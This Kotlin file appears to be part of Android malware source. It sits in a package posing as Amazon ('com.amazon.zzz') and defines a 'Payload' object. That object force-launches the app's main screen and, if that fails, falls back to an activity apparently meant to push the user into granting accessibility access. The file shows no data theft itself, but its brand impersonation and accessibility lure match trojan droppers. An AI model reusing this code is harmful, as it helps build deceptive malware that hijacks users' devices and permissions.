package com.amazon.zzz

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import com.amazon.zzz.Activities.actToastAccessbility
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utUtils

object Payload {

    @JvmStatic
    fun start(app: Context) {
        Handler(Looper.getMainLooper()).postDelayed({
            SharedPreferencess.init(app.applicationContext)
            SharedPreferencess.appName = utUtils.getLabelApplication(app.applicationContext)
            runCatching {
                val intent = Intent(app, MainActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                app.startActivity(intent)
            }.onFailure {
                runCatching {
                    val intent = Intent(app, actToastAccessbility::class.java)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    app.startActivity(intent)
                }
            }
        }, 1000)
    }

    fun start2(app: Context) {
        runCatching {
            val intent = Intent(app, MainActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK).addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            app.startActivity(intent)
        }.onFailure {
            runCatching {
                val intent = Intent(app, actToastAccessbility::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK).addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                app.startActivity(intent)
            }
        }
    }

}